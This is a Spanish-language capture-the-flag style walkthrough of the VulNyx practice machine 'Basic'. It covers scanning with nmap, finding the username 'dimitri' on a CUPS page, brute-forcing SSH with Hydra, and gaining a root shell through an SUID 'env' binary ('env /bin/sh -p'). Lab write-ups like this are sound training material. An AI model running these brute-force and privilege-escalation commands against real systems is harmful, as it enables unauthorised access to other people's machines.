Maquinas que vamos a utilizar **Kali Linux y Basic** [https://vulnyx.com/#basic](https://vulnyx.com/#basic)

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 58.png|image 58.png]]

  

```Bash
ping -c 1 10.0.3.22
```

![[Imagenes/image 1 47.png|image 1 47.png]]

  

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.22
```

![[Imagenes/image 2 46.png|image 2 46.png]]

  

- Vamos a ver lo que esta corriendo por el **puerto 80**
    
    ![[Imagenes/image 3 45.png|image 3 45.png]]
    

  

- Miramos lo que corre atreves del **puerto 631**
    
    ![[Imagenes/image 4 43.png|image 4 43.png]]
    
- Vamos a husmear un poco y nos vamos a la **pestaña Printers** y vemos un posible nombre de usuario **dimitri**.
    
    ![[Imagenes/image 5 42.png|image 5 42.png]]
    
- En el **nmap** habíamos visto que estaba **abierto el puerto 22** del **SSH** . Vamos a intentar un **ataque de fuerza bruta** con **Hydra** aprovechando que tenemos un posible nombre de usuario.
    
    ```Bash
    hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.22
    ```
    
    ![[Imagenes/image 6 40.png|image 6 40.png]]
    
    Nos a sacado un resultado de contraseña: **mememe.**
    
      
    
- Nos conectamos vía SSH.
    
    ```Bash
    ssh dimitri@10.0.3.22
    ```
    
    ![[Imagenes/image 7 38.png|image 7 38.png]]
    

- Buscamos binarios vulnerables.
    
    `find / -perm -4000 2>/dev/null`
    
    ![[Imagenes/image 8 36.png|image 8 36.png]]
    

- Nos vamos a la web [https://gtfobins.github.io/](https://gtfobins.github.io/) y miramos aquellos binarios que no son comunes y podamos pensar que son vulnerable a un ataque SUID. En nuestro caso seria `env`.
    
    ![[Imagenes/image 9 33.png|image 9 33.png]]
    
    ![[Imagenes/image 10 29.png|image 10 29.png]]
    
    ![[Imagenes/image 11 23.png|image 11 23.png]]
    
      
    
- Deberíamos probar ambos comandos para ver cual funciona. Pero vamos a probar `./env /bin/sh -p`
    
    Antes de probarlo debemos tener en cuenta que nosotros no estamos situados dentro de la ruta absoluta **del archivo “env”** `**/usr/bin/**` **deberemos quitar el punto que del inicio del comando quedando así** `**env /bin/sh -p**`
    
    `**env /bin/sh -p**`
    
    ![[Imagenes/image 12 23.png|image 12 23.png]]